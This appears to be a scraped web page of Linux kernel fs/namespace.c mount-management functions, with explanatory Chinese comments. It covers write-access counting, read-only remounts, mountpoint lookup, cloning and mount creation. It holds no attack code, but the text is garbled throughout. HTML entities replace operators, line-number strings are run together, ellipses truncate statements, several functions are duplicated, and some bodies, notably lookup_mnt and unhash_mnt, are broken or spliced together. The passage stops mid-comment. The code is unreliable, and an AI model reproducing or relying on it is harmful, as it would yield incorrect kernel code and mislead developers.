kfree_const(mnt-&gt;mnt_devname);#endifout_free_id: // 释放挂载点ID mnt_free_id(mnt);out_free_cache: // 释放挂载点结构体的内存 kmem_cache_free(mnt_cache, mnt); return NULL;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940/* * 大多数对文件系统的只读检查是针对需要离散时间的操作，比如write()或unlink()。 * 我们必须跟踪这些操作的开始时间（用于权限检查）和结束时间，以便确定何时可以对文件系统进行写操作。 *//* * __mnt_is_readonly: 检查挂载点是否为只读 * @mnt: 要检查其写入状态的挂载点 * * 这个函数不应该直接在VFS之外使用。 * 它不能保证文件系统将保持读/写状态，只能表示当前状态。不能将其用于替代IS_RDONLY(inode)。 * mnt_want/drop_write()将保持文件系统的读/写状态。 */bool __mnt_is_readonly(struct vfsmount *mnt)&#123; // 检查挂载点的mnt_flags是否包含MNT_READONLY标志，或者通过sb_rdonly()函数检查mnt_sb是否为只读 return (mnt-&gt;mnt_flags &amp; MNT_READONLY) || sb_rdonly(mnt-&gt;mnt_sb);&#125;EXPORT_SYMBOL_GPL(__mnt_is_readonly);static inline void mnt_inc_writers(struct mount *mnt)&#123;#ifdef CONFIG_SMP // 在本地CPU变量中增加mnt_writers this_cpu_inc(mnt-&gt;mnt_pcp-&gt;mnt_writers);#else // 增加mnt_writers mnt-&gt;mnt_writers++;#endif&#125;static inline void mnt_dec_writers(struct mount *mnt)&#123;#ifdef CONFIG_SMP // 在本地CPU变量中减少mnt_writers this_cpu_dec(mnt-&gt;mnt_pcp-&gt;mnt_writers);#else // 减少mnt_writers mnt-&gt;mnt_writers--;#endif&#125; 123456789101112131415161718192021222324252627static unsigned int mnt_get_writers(struct mount *mnt)&#123;#ifdef CONFIG_SMP unsigned int count = 0; int cpu; // 遍历所有可能的CPU，累加mnt_writers for_each_possible_cpu(cpu) &#123; count += per_cpu_ptr(mnt-&gt;mnt_pcp, cpu)-&gt;mnt_writers; &#125; return count;#else // 返回mnt_writers return mnt-&gt;mnt_writers;#endif&#125;static int mnt_is_readonly(struct vfsmount *mnt)&#123; if (mnt-&gt;mnt_sb-&gt;s_readonly_remount) return 1; /* 在do_remount()中设置s_flags/s_readonly_remount的顺序 */ smp_rmb(); // 调用__mnt_is_readonly()函数检查挂载点是否为只读 return __mnt_is_readonly(mnt);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* * 大多数对文件系统的只读和冻结检查是针对需要离散时间的操作，比如write()或unlink()。 * 我们必须跟踪这些操作的开始时间（用于权限检查）和结束时间，以便确定何时可以对文件系统进行写操作。 *//** * __mnt_want_write - 在没有冻结保护的情况下获取对挂载点的写访问权限 * @m: 要进行写操作的挂载点 * * 这告诉底层文件系统将要对其执行写操作，并确保在返回成功之前允许写操作（挂载点为读写状态）。 * 此操作不保护文件系统的冻结状态。在写操作完成后，必须调用__mnt_drop_write()函数。这实际上是一个引用计数。 */int __mnt_want_write(struct vfsmount *m)&#123; struct mount *mnt = real_mount(m); int ret = 0; preempt_disable(); // 在本地CPU变量中增加mnt_writers mnt_inc_writers(mnt); /* * 对mnt_inc_writers的存储必须在我们通过MNT_WRITE_HOLD循环之前可见， * 这样慢路径可以在设置MNT_WRITE_HOLD后看到我们增加的计数。 */ smp_mb(); might_lock(&amp;mount_lock.lock); while (READ_ONCE(mnt-&gt;mnt.mnt_flags) &amp; MNT_WRITE_HOLD) &#123; if (!IS_ENABLED(CONFIG_PREEMPT_RT)) &#123; // 在非实时内核中，放松CPU以减少自旋 cpu_relax(); &#125; else &#123; /* * 这可以防止优先级倒置，如果设置MNT_WRITE_HOLD的任务在远程CPU上被抢占， * 并且它可以防止生活锁定，如果设置MNT_WRITE_HOLD的任务具有较低的优先级并且绑定到与此处自旋的任务相同的CPU。 */ preempt_enable(); lock_mount_hash(); unlock_mount_hash(); preempt_disable(); &#125; &#125; /* * 在慢路径清除MNT_WRITE_HOLD之后，mnt_is_readonly将被设置为与其要求匹配的值。 * 因此，在清除MNT_WRITE_HOLD之前，我们不能加载mnt_is_readonly。 */ smp_rmb(); if (mnt_is_readonly(m)) &#123; // 减少mnt_writers mnt_dec_writers(mnt); ret = -EROFS; &#125; preempt_enable(); return ret;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/** * mnt_want_write - 获取对挂载点的写访问权限 * @m: 要进行写操作的挂载点 * * 这告诉底层文件系统即将对其进行写操作，并确保在返回成功之前允许写操作（挂载点为读写状态，... ret; // 开始写操作 sb_start_write(m-&gt;mnt_sb); // 调用__mnt_want_write函数获取写访问权限 ret = __mnt_want_write(m); if (ret) // 如果获取写访问权限失败，则结束写操作 sb_end_write(m-&gt;mnt_sb); return ret;&#125;EXPORT_SYMBOL_GPL(mnt_want_write);/** * __mnt_want_write_file - 获取对文件的写访问权限 * @file: 要进行写操作的文件 * * 这类似于__mnt_want_write，但如果文件已经以写模式打开，则跳过增加mnt_writers的步骤（因为打开的文件已经有一个引用）， * 而只进行紧急只读重新挂载的检查。这必须与__mnt_drop_write_file配对使用。 */int __mnt_want_write_file(struct file *file)&#123; if (file-&gt;f_mode &amp; FMODE_WRITER) &#123; /* * 当仍然存在可写的文件描述符时，超级块可能已变为只读状态， * 例如由于具有errors=remount-ro的文件系统错误 */ if (__mnt_is_readonly(file-&gt;f_path.mnt)) return -EROFS; return 0; &#125; // 调用__mnt_want_write函数获取写访问权限 return __mnt_want_write(file-&gt;f_path.mnt);&#125;/** * mnt_want_write_file - 获取对文件的写访问权限 * @file: 要进行写操作的文件 * * 这类似于mnt_want_write，但如果文件已经以写模式打开，则跳过增加mnt_writers的步骤（因为打开的文件已经有一个引用）， * 而只进行冻结保护和紧急只读重新挂载的检查。这必须与mnt_drop_write_file配对使用。 */int mnt_want_write_file(struct file *file)&#123; int ret; // 开始写操作 sb_start_write(file_inode(file)-&gt;i_sb); // 调用__mnt_want_write_file函数获取写访问权限 ret = __mnt_want_write_file(file); if (ret) // 如果获取写访问权限失败，则结束写操作 sb_end_write(file_inode(file)-&gt;i_sb); return ret;&#125;EXPORT_SYMBOL_GPL(mnt_want_write_file); 123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * __mnt_drop_write - 放弃对挂载点的写访问权限 * @mnt: 要放弃写访问权限的挂载点 * * 告诉底层文件系统我们已经完成对其的写操作。必须与上面的__mnt_want_write()调用匹配。 */void __mnt_drop_write(struct vfsmount *mnt)&#123; preempt_disable(); // 减少mnt_writers mnt_dec_writers(real_mount(mnt)); preempt_enable();&#125;/** * mnt_drop_write - 放弃对挂载点的写访问权限 * @mnt: 要放弃写访问权限的挂载点 * * ... 告诉底层文件系统我们已经完成对其的写操作，并允许文件系统再次被冻结。 * 必须与上面的mnt_want_write()调用匹配。 */void mnt_drop_write(struct vfsmount *mnt)&#123; // 调用__mnt_drop_write函数放弃写访问权限 __mnt_drop_write(mnt); // 结束写操作 sb_end_write(mnt-&gt;mnt_sb);&#125;EXPORT_SYMBOL_GPL(mnt_drop_write);void __mnt_drop_write_file(struct file *file)&#123; if (!(file-&gt;f_mode &amp; FMODE_WRITER)) // 如果文件不是以写模式打开，则调用__mnt_drop_write函数放弃写访问权限 __mnt_drop_write(file-&gt;f_path.mnt);&#125;void mnt_drop_write_file(struct file *file)&#123; // 调用__mnt_drop_write_file函数放弃写访问权限 __mnt_drop_write_file(file); // 结束写操作 sb_end_write(file_inode(file)-&gt;i_sb);&#125;EXPORT_SYMBOL(mnt_drop_write_file); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253static int mnt_make_readonly(struct mount *mnt)&#123; int ret; ret = mnt_hold_writers(mnt); // 调用函数 mnt_hold_writers() 来获取写锁 if (!ret) mnt-&gt;mnt.mnt_flags |= MNT_READONLY; // 将 MNT_READONLY 标志位设置为 1，表示挂载点只读 mnt_unhold_writers(mnt); // 释放写锁 return ret;&#125;int sb_prepare_remount_readonly(struct super_block *sb)&#123; struct mount *mnt; int err = 0; /* Racy optimization. Recheck the counter under MNT_WRITE_HOLD */ if (atomic_long_read(&amp;sb-&gt;s_remove_count)) // 检查 s_remove_count 计数器的值 return -EBUSY; // 如果计数器的值不为 0，则返回忙碌错误码 lock_mount_hash(); // 锁定挂载点哈希表 list_for_each_entry(mnt, &amp;sb-&gt;s_mounts, mnt_instance) &#123; if (!(mnt-&gt;mnt.mnt_flags &amp; MNT_READONLY)) &#123; // 检查挂载点是否为只读 err = mnt_hold_writers(mnt); // 调用函数 mnt_hold_writers() 来获取写锁 if (err) break; &#125; &#125; if (!err &amp;&amp; atomic_long_read(&amp;sb-&gt;s_remove_count)) // 再次检查 s_remove_count 计数器的值 err = -EBUSY; // 如果计数器的值不为 0，则返回忙碌错误码 if (!err) &#123; sb-&gt;s_readonly_remount = 1; // 将 s_readonly_remount 标志位设置为 1，表示准备进行只读重新挂载 smp_wmb(); // 内存屏障，确保标志位的修改对其他 CPU 可见 &#125; list_for_each_entry(mnt, &amp;sb-&gt;s_mounts, mnt_instance) &#123; if (mnt-&gt;mnt.mnt_flags &amp; MNT_WRITE_HOLD) // 检查挂载点是否持有写锁 mnt-&gt;mnt.mnt_flags &amp;= ~MNT_WRITE_HOLD; // 清除 MNT_WRITE_HOLD 标志位 &#125; unlock_mount_hash(); // 解锁挂载点哈希表 return err;&#125;static void free_vfsmnt(struct mount *mnt)&#123; mnt_idmap_put(mnt_idmap(&amp;mnt-&gt;mnt)); // 释放挂载点的 ID 映射 kfree_const(mnt-&gt;mnt_devname); // 释放挂载点的设备名称内存#ifdef CONFIG_SMP free_percpu(mnt-&gt;mnt_pcp); // 释放挂载点的 percpu 变量#endif kmem_cache_free(mnt_cache, mnt); // 释放挂载点的内存&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/* * lookup_mnt - 返回挂载在路径上的第一个子挂载点 * * &quot;第一个&quot; 指的是按时间顺序第一个挂载的。如果你创建了以下挂载点： * * mount /dev/sda1 /mnt * mount /dev/sda2 /mnt * mount /dev/sda3 ... /mnt * * 那么在根挂载点上的基础路径 /mnt 上调用 lookup_mnt() 将依次返回 ... /dev/sda1 的根 dentry 和 vfsmount， * 然后是 /dev/sda2，然后是 /dev/sda3，然后是 NULL。 * * ... lookup_mnt() 会引用找到的 vfsmount。 */struct vfsmount *lookup_mnt(const struct path *path)&#123; struct mount *child_mnt; struct vfsmount *m; unsigned seq; rcu_read_lock(); // 读取锁定 RCU do &#123; seq = m; // 读取序列号 child_mnt = m; // 获取子挂载点 if (child_mnt) &#123; m = &amp;child_mnt-&gt;mnt; if (mnt_is_cursor(child_mnt)) // 检查挂载点是否为游标挂载点 break; &#125; else &#123; m = NULL; &#125; &#125; while (m); rcu_read_unlock(); // 解锁 RCU return m; // 返回找到的 vfsmount&#125;static inline void lock_ns_list(struct mnt_namespace *ns)&#123; spin_lock(&amp;ns-&gt;ns_lock); // 锁定命名空间的锁&#125;static inline void unlock_ns_list(struct mnt_namespace *ns)&#123; spin_unlock(&amp;ns-&gt;ns_lock); // 解锁命名空间的锁&#125;static inline bool mnt_is_cursor(struct mount *mnt)&#123; return mnt-&gt;mnt.mnt_flags &amp; MNT_CURSOR; // 检查挂载点是否为游标挂载点&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* * __is_local_mountpoint - 测试dentry是否是当前挂载命名空间中的挂载点。 * * 通常情况下，dentry根本不是挂载点，这种情况在内联中处理。 * 当我们实际处理某种类型的挂载点时，会遍历当前挂载命名空间中的所有挂载，并测试dentry是否是挂载点。 * * 在此上下文中，无法使用mount_hashtable，因为我们需要识别可能在当前挂载命名空间中的所有挂载， * 而不仅仅是具有某个指定父挂载的挂载。 */bool __is_local_mountpoint(struct dentry *dentry)&#123; struct mnt_namespace *ns = current-&gt;nsproxy-&gt;mnt_ns; // 获取当前进程的挂载命名空间 struct mount *mnt; bool is_covered = false; // 标记dentry是否是挂载点 down_read(&amp;namespace_sem); // 获取命名空间信号量，防止并发访问 lock_ns_list(ns); // 锁定挂载列表，防止并发访问 list_for_each_entry(mnt, &amp;ns-&gt;list, mnt_list) &#123; if (mnt_is_cursor(mnt)) continue; is_covered = (mnt-&gt;mnt_mountpoint == dentry); // 判断dentry是否是挂载点 if (is_covered) break; &#125; unlock_ns_list(ns); // 解锁挂载列表 up_read(&amp;namespace_sem); // 释放命名空间信号量 return is_covered;&#125;/* * lookup_mountpoint - 查找指定dentry的挂载点。 * * 遍历指定dentry的哈希链表，查找与之匹配的挂载点。 * 如果找到匹配的挂载点，则增加其引用计数并返回该挂载点。 * 如果未找到匹配的挂载点，则返回NULL。 */static struct mountpoint *lookup_mountpoint(struct dentry *dentry)&#123; struct hlist_head *chain = mp_hash(dentry); // 获取指定dentry的哈希链表头 struct mountpoint *mp; hlist_for_each_entry(mp, chain, m_hash) &#123; if (mp-&gt;m_dentry == dentry) &#123; mp-&gt;m_count++; // 增加挂载点的引用计数 return mp; &#125; &#125; return NULL;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748static struct mountpoint *get_mountpoint(struct dentry *dentry)&#123; struct mountpoint *mp, *new = NULL; int ret; if (d_mountpoint(dentry)) &#123; /* 可能值得一个 WARN_ON() */ if (d_unlinked(dentry)) return ERR_PTR(-ENOENT);mountpoint: read_seqlock_excl(&amp;mount_lock); // 获取挂载锁，防止并发访问 mp = lookup_mountpoint(dentry); // 查找指定dentry的挂载点 read_sequnlock_excl(&amp;mount_lock); // 释放挂载锁 if (mp) goto done; &#125; if (!new) new = kmalloc(sizeof(struct mountpoint), GFP_KERNEL); // 分配新的挂载点结构体 if (!new) return ERR_PTR(-ENOMEM); // 内存分配失败 /* 只有一个进程可以设置 d_mounted */ ret = d_set_mounted(dentry); // 设置dentry的d_mounted标志位 /* 有其他进程设置了 d_mounted? */ if (ret == -EBUSY) goto mountpoint; /* dentry不可用作挂载点? */ mp = ERR_PTR(ret); if (ret) goto done; /* 将新的挂载点添加到哈希表中 */ read_seqlock_excl(&amp;mount_lock); // 获取挂载锁，防止并发访问 new-&gt;m_dentry = dget(dentry); // 增加dentry的引用计数 new-&gt;m_count = 1; // 设置挂载点的引用计数 hlist_add_head(&amp;new-&gt;m_hash, mp_hash(dentry)); // 将挂载点添加到哈希表中 INIT_HLIST_HEAD(&amp;new-&gt;m_list); // 初始化挂载点的链表头 read_sequnlock_excl(&amp;mount_lock); // 释放挂载锁 mp = new; new = NULL;done: kfree(new); // 释放新的挂载点结构体的内存 return mp;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/* * vfsmount锁必须被持有。此外，调用者负责对给定的处理列表进行序列化调用。 */static void __put_mountpoint(struct mountpoint *mp, struct list_head *list)&#123; if (!--mp-&gt;m_count) &#123; // 如果挂载点的引用计数减为0 struct dentry *dentry = mp-&gt;m_dentry; BUG_ON(!hlist_empty(&amp;mp-&gt;m_list)); // 断言挂载点的链表为空 spin_lock(&amp;dentry-&gt;d_lock); // 获取dentry的自旋锁 dentry-&gt;d_flags &amp;= ~DCACHE_MOUNTED; // 清除dentry的DCACHE_MOUNTED标志位 spin_unlock(&amp;dentry-&gt;d_lock); // 释放dentry的自旋锁 dput_to_list(dentry, list); // 将dentry放入指定的列表中 hlist_del(&amp;mp-&gt;m_hash); // 从哈希表中删除挂载点 kfree(mp); // 释放挂载点的内存 &#125;&#125;/* 在namespace_lock和vfsmount锁的保护下调用 */static void put_mountpoint(struct mountpoint *mp)&#123; __put_mountpoint(mp, &amp;ex_mountpoints); // 调用__put_mountpoint函数，将挂载点放入ex_mountpoints列表中&#125;static inline int check_mnt(struct mount *mnt)&#123; return mnt-&gt;mnt_ns == current-&gt;nsproxy-&gt;mnt_ns; // 检查给定的挂载是否属于当前进程的挂载命名空间&#125;/* * vfsmount锁必须被持有（写模式） */static void touch_mnt_namespace(struct mnt_namespace *ns)&#123; if (ns) &#123; ns-&gt;event = ++event; // 更新挂载命名空间的事件计数 wake_up_interruptible(&amp;ns-&gt;poll); // 唤醒等待挂载命名空间事件的进程 &#125;&#125;/* * vfsmount锁必须被持有（写模式） */static void __touch_mnt_namespace(struct mnt_namespace *ns)&#123; if (ns &amp;&amp; ns-&gt;event != event) &#123; ns-&gt;event = event; // 更新挂载命名空间的事件计数 wake_up_interruptible(&amp;ns-&gt;poll); // 唤醒等待挂载命名空间事件的进程 &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536/* * vfsmount lock must be held for write */static struct mountpoint *unhash_mnt(struct mount *mnt)&#123; struct mountpoint *mp; mnt-&gt;mnt_parent = mnt; // 将mnt的父挂载设置为自身 mnt-&gt;mnt_mountpoint = ... *mp, // 将mnt的挂载点设置为... *mp struct mount *child_mnt) &#123; mp-&gt;m_count++; // 增加mp的引用计数 mnt_add_count(mnt, 1); // 增加mnt的引用计数 child_mnt-&gt;mnt_mountpoint = mp-&gt;m_dentry; // 将child_mnt的挂载点设置为mp的dentry child_mnt-&gt;mnt_parent = ... mnt; // 将child_mnt的父挂载设置为mnt child_mnt-&gt;mnt_mp = mp; // 将child_mnt的mnt_mp设置为mp hlist_add_head(&amp;child_mnt-&gt;mnt_mp_list, &amp;mp-&gt;m_list); // 将child_mnt添加到mp的m_list链表头部 &#125;&#125;static void __attach_mnt(struct mount *mnt, struct mount *parent)&#123; hlist_add_head_rcu(&amp;mnt-&gt;mnt_hash, ... m_hash(&amp;parent-&gt;mnt, mnt-&gt;mnt_mountpoint)); // 将mnt添加到parent的mnt_hash链表头部 list_add_tail(&amp;mnt-&gt;mnt_child, &amp;parent-&gt;mnt_mounts); // 将mnt添加到parent的mnt_mounts链表尾部&#125;/* * vfsmount lock must be held for write */static void attach_mnt(struct mount *mnt, struct mount *parent, struct ... mountpoint *mp)&#123; mnt_set_mountpoint(parent, mp, mnt); // 设置parent的挂载点为mp，将mnt设置为mp的挂载 __attach_mnt(mnt, parent); // 将mnt添加到parent的mnt_hash链表头部，将mnt添加到parent的mnt_mounts链表尾部&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374void mnt_change_mountpoint(struct mount *parent, struct mountpoint *mp, struct mount *mnt)&#123; // 保存旧的挂载点和父挂载 struct mountpoint *old_mp = mnt-&gt;mnt_mp; struct mount *old_parent = mnt-&gt;mnt_parent; // 从相关链表中删除当前挂载 list_del_init(&amp;mnt-&gt;mnt_child); hlist_del_init(&amp;mnt-&gt;mnt_mp_list); hlist_del_init_rcu(&amp;mnt-&gt;mnt_hash); // 将当前挂载点附加到新的父挂载和挂载点上 attach_mnt(mnt, parent, mp); // 释放旧的挂载点 put_mountpoint(old_mp); // 更新旧的父挂载的挂载计数 mnt_add_count(old_parent, -1);&#125;/* * vfsmount lock must be held for write */static void commit_tree(struct mount *mnt)&#123; // 获取父挂载 struct mount *parent = mnt-&gt;mnt_parent; struct mount *m; LIST_HEAD(head); struct mnt_namespace *n = parent-&gt;mnt_ns; // 检查父挂载和当前挂载是否相同 BUG_ON(parent == mnt); // 将当前挂载添加到链表头部 list_add_tail(&amp;head, &amp;mnt-&gt;mnt_list); // 遍历链表中的每个挂载，将它们的命名空间设置为父挂载的命名空间 list_for_each_entry(m, &amp;head, mnt_list) m-&gt;mnt_ns = n; // 将链表插入到命名空间的末尾 list_splice(&amp;head, n-&gt;list.prev); // 更新命名空间的挂载计数和待挂载计数 n-&gt;mounts += n-&gt;pending_mounts; n-&gt;pending_mounts = 0; // 将当前挂载附加到父挂载 __attach_mnt(mnt, parent); // 更新命名空间的访问时间戳 touch_mnt_namespace(n);&#125;static struct mount *next_mnt(struct mount *p, struct mount *root)&#123; // 获取下一个挂载点 struct list_head *next = p-&gt;mnt_mounts.next; if (next == &amp;p-&gt;mnt_mounts) &#123; while (1) &#123; // 如果已经到达根挂载点，则返回空 if (p == root) return NULL; // 获取父挂载的下一个挂载点 next = p-&gt;mnt_child.next; // 如果下一个挂载点不是父挂载的链表头，则跳出循环 if (next != &amp;p-&gt;mnt_parent-&gt;mnt_mounts) break; // 更新父挂载为当前挂载的父挂载 p = p-&gt;mnt_parent; &#125; &#125; // 返回下一个挂载点 return list_entry(next, struct mount, mnt_child);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273static struct mount *skip_mnt_tree(struct mount *p)&#123; // 获取上一个挂载点 struct list_head *prev = p-&gt;mnt_mounts.prev; while (prev != &amp;p-&gt;mnt_mounts) &#123; // 将上一个挂载点赋值给当前挂载点，并继续向前遍历 p = list_entry(prev, struct mount, mnt_child); prev = p-&gt;mnt_mounts.prev; &#125; // 返回最后一个挂载点 return p;&#125;/** * vfs_create_mount - Create a mount for a configured superblock * @fc: The configuration context with the superblock attached * * Create a mount to an already configured superblock. If necessary, the * caller should invoke vfs_get_tree() before calling this. * * Note that this does not attach the mount to anything. */struct vfsmount *vfs_create_mount(struct fs_context *fc)&#123; struct mount *mnt; // 检查根目录是否存在 if (!fc-&gt;root) return ERR_PTR(-EINVAL); // 分配一个新的挂载结构体 mnt = alloc_vfsmnt(fc-&gt;source ?: &quot;none&quot;); if (!mnt) return ERR_PTR(-ENOMEM); // 如果是内核挂载，则设置挂载标志为MNT_INTERNAL if (fc-&gt;sb_flags &amp; SB_KERNMOUNT) mnt-&gt;mnt.mnt_flags = MNT_INTERNAL; // 增加超级块的活跃引用计数 atomic_inc(&amp;fc-&gt;root-&gt;d_sb-&gt;s_active); // 设置挂载的超级块、根目录、挂载点和父挂载 mnt-&gt;mnt.mnt_sb = fc-&gt;root-&gt;d_sb; mnt-&gt;mnt.mnt_root = dget(fc-&gt;root); mnt-&gt;mnt_mountpoint = mnt-&gt;mnt.mnt_root; mnt-&gt;mnt_parent = mnt; // 锁定挂载哈希表 lock_mount_hash(); // 将挂载添加到超级块的挂载链表末尾 list_add_tail(&amp;mnt-&gt;mnt_instance, &amp;mnt-&gt;mnt.mnt_sb-&gt;s_mounts); // 解锁挂载哈希表 unlock_mount_hash(); // 返回挂载结构体指针 return &amp;mnt-&gt;mnt;&#125;EXPORT_SYMBOL(vfs_create_mount);struct vfsmount *fc_mount(struct fs_context *fc)&#123; // 获取文件系统树 int err = vfs_get_tree(fc); if (!err) &#123; // 释放超级块的卸载信号量 up_write(&amp;fc-&gt;root-&gt;d_sb-&gt;s_umount); // 创建挂载 return vfs_create_mount(fc); &#125; // 返回错误码 return ERR_PTR(err);&#125;EXPORT_SYMBOL(fc_mount); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172static struct mount *skip_mnt_tree(struct mount *p)&#123; // 获取上一个挂载点 struct list_head *prev = p-&gt;mnt_mounts.prev; while (prev != &amp;p-&gt;mnt_mounts) &#123; // 将上一个挂载点赋值给当前挂载点，并继续向前遍历 p = list_entry(prev, struct mount, mnt_child); prev = p-&gt;mnt_mounts.prev; &#125; // 返回最后一个挂载点 return p;&#125;/** * vfs_create_mount - 为已配置的超级块创建一个挂载点 * @fc: 带有已连接超级块的配置上下文 * * 为已配置的超级块创建一个挂载点。如果需要，在调用此函数之前，调用者应该调用vfs_get_tree()。 * * 注意，这不会将挂载点附加到任何位置。 */struct vfsmount *vfs_create_mount(struct fs_context *fc)&#123; struct mount *mnt; // 检查根目录是否存在 if (!fc-&gt;root) return ERR_PTR(-EINVAL); // 分配一个新的挂载结构体 mnt = alloc_vfsmnt(fc-&gt;source ?: &quot;none&quot;); if (!mnt) return ERR_PTR(-ENOMEM); // 如果是内核挂载，则设置挂载标志为MNT_INTERNAL if (fc-&gt;sb_flags &amp; SB_KERNMOUNT) mnt-&gt;mnt.mnt_flags = MNT_INTERNAL; // 增加超级块的活跃引用计数 atomic_inc(&amp;fc-&gt;root-&gt;d_sb-&gt;s_active); // 设置挂载的超级块、根目录、挂载点和父挂载 mnt-&gt;mnt.mnt_sb = fc-&gt;root-&gt;d_sb; mnt-&gt;mnt.mnt_root = dget(fc-&gt;root); mnt-&gt;mnt_mountpoint = mnt-&gt;mnt.mnt_root; mnt-&gt;mnt_parent = mnt; // 锁定挂载哈希表 lock_mount_hash(); // 将挂载添加到超级块的挂载链表末尾 list_add_tail(&amp;mnt-&gt;mnt_instance, &amp;mnt-&gt;mnt.mnt_sb-&gt;s_mounts); // 解锁挂载哈希表 unlock_mount_hash(); // 返回挂载结构体指针 return &amp;mnt-&gt;mnt;&#125;EXPORT_SYMBOL(vfs_create_mount);struct vfsmount *fc_mount(struct fs_context *fc)&#123; // 获取文件系统树 int err = vfs_get_tree(fc); if (!err) &#123; // 释放超级块的卸载信号量 up_write(&amp;fc-&gt;root-&gt;d_sb-&gt;s_umount); // 创建挂载 return vfs_create_mount(fc); &#125; // 返回错误码 return ERR_PTR(err);&#125;EXPORT_SYMBOL(fc_mount); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354struct vfsmount *vfs_kern_mount(struct file_system_type *type, int flags, const char *name, void *data)&#123; // 创建文件系统上下文 struct fs_context *fc; // 挂载点 struct vfsmount *mnt; // 返回值 int ret = 0; // 检查文件系统类型是否为空 if (!type) return ERR_PTR(-EINVAL); // 为挂载创建文件系统上下文 fc = fs_context_for_mount(type, flags); if (IS_ERR(fc)) return ERR_CAST(fc); // 如果指定了挂载名字，则解析挂载源字符串 if (name) ret = vfs_parse_fs_string(fc, &quot;source&quot;, name, strlen(name)); // 如果解析挂载源字符串成功，则解析挂载数据 if (!ret) ret = parse_monolithic_mount_data(fc, data); // 如果解析挂载数据成功，则进行挂载 if (!ret) mnt = fc_mount(fc); else mnt = ERR_PTR(ret); // 释放文件系统上下文 put_fs_context(fc); // 返回挂载点 return mnt;&#125;EXPORT_SYMBOL_GPL(vfs_kern_mount);struct vfsmount *vfs_submount(const struct dentry *mountpoint, struct file_system_type *type, const char *name, void *data)&#123; /* 目前还没有解决如何从父挂载传递用户命名空间到子挂载， * 因此不支持带有子挂载的非特权挂载。 */ if (mountpoint-&gt;d_sb-&gt;s_user_ns != &amp;init_user_ns) return ERR_PTR(-EPERM); // 调用vfs_kern_mount进行子挂载 return vfs_kern_mount(type, SB_SUBMOUNT, name, data);&#125;EXPORT_SYMBOL_GPL(vfs_submount); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384static struct mount *clone_mnt(struct mount *old, struct dentry *root, int flag)&#123; // 克隆一个挂载点结构体 struct super_block *sb = old-&gt;mnt.mnt_sb; struct mount *mnt; int err; // 分配一个虚拟文件系统挂载点 mnt = alloc_vfsmnt(old-&gt;mnt_devname); if (!mnt) return ERR_PTR(-ENOMEM); // 设置挂载点的组ID if (flag &amp; (CL_SLAVE | CL_PRIVATE | CL_SHARED_TO_SLAVE)) mnt-&gt;mnt_group_id = 0; /* 不是原始挂载点的对等点 */ else mnt-&gt;mnt_group_id = old-&gt;mnt_group_id; // 如果需要创建共享挂载点，并且挂载点没有组ID，则分配一个组ID if ((flag &amp; CL_MAKE_SHARED) &amp;&amp; !mnt-&gt;mnt_group_id) &#123; err = mnt_alloc_group_id(mnt); if (err) goto out_free; &#125; // 复制挂载点的标志位 mnt-&gt;mnt.mnt_flags = old-&gt;mnt.mnt_flags; mnt-&gt;mnt.mnt_flags &amp;= ~(MNT_WRITE_HOLD | MNT_MARKED | MNT_INTERNAL); // 增加超级块的活跃引用计数 atomic_inc(&amp;sb-&gt;s_active); // 获取挂载点的ID映射 mnt-&gt;mnt.mnt_idmap = mnt_idmap_get(mnt_idmap(&amp;old-&gt;mnt)); // 设置挂载点的超级块、根目录、挂载点和父挂载点 mnt-&gt;mnt.mnt_sb = sb; mnt-&gt;mnt.mnt_root = dget(root); mnt-&gt;mnt_mountpoint = mnt-&gt;mnt.mnt_root; mnt-&gt;mnt_parent = mnt; lock_mount_hash(); // 将挂载点添加到超级块的挂载点链表中 list_add_tail(&amp;mnt-&gt;mnt_instance, &amp;sb-&gt;s_mounts); unlock_mount_hash(); // 如果是从属挂载点或者是共享给从属挂载点的挂载点 if ((flag &amp; CL_SLAVE) || ((flag &amp; CL_SHARED_TO_SLAVE) &amp;&amp; IS_MNT_SHARED(old))) &#123; // 将挂载点添加到原始挂载点的从属挂载点链表中 list_add(&amp;mnt-&gt;mnt_slave, &amp;old-&gt;mnt_slave_list); mnt-&gt;mnt_master = old; CLEAR_MNT_SHARED(mnt); &#125; // 如果不是私有挂载点 else if (!(flag &amp; CL_PRIVATE)) &#123; // 如果需要创建共享挂载点或者原始挂载点是共享的，则将挂载点添加到原始挂载点的共享挂载点链表中 if ((flag &amp; CL_MAKE_SHARED) || IS_MNT_SHARED(old)) list_add(&amp;mnt-&gt;mnt_share, &amp;old-&gt;mnt_share); // 如果原始挂载点是从属挂载点，则将挂载点添加到原始挂载点的从属挂载点链表中 if (IS_MNT_SLAVE(old)) list_add(&amp;mnt-&gt;mnt_slave, &amp;old-&gt;mnt_slave); mnt-&gt;mnt_master = old-&gt;mnt_master; &#125; // 如果是私有挂载点 else &#123; CLEAR_MNT_SHARED(mnt); &#125; // 如果需要创建共享挂载点，则设置挂载点为共享的 if (flag &amp; CL_MAKE_SHARED) set_mnt_shared(mnt); // 如果需要设置挂载点的过期时间，并且原始挂载点的过期链表不为空，则将挂载点添加到原始挂载点的过期链表中 if (flag &amp; CL_EXPIRE) &#123; if (!list_empty(&amp;old-&gt;mnt_expire)) list_add(&amp;mnt-&gt;mnt_expire, &amp;old-&gt;mnt_expire); &#125; return mnt; out_free: mnt_free_id(mnt); free_vfsmnt(mnt); return ERR_PTR(err);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051static void cleanup_mnt(struct mount *mnt)&#123; struct hlist_node *p; struct mount *m; /* * 这里的警告可能表示某人搞乱了mnt_want/drop_write()对。如果发生这种情况， * 